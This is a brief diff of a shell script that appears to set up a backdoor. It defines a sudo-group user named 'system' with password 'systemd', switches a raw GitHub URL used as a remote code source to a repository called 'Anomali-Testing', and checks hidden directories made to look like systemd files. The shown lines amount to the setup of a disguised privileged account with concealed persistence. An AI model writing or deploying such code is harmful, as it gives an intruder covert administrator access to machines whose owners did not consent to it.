@@ -2,7 +2,7 @@
 USER="system"
 PASS="systemd"
 SUDO_GROUP="sudo"
-GITHUB_RAW="https://raw.githubusercontent.com/b2hunters/user-spawn-system/main"
+GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"
 
 # Cek di 3 lokasi backup
 for BACKUP_LOC in /var/tmp/.systemd-backup /opt/.config/.cache/.systemd /usr/share/.misc/.backup; do
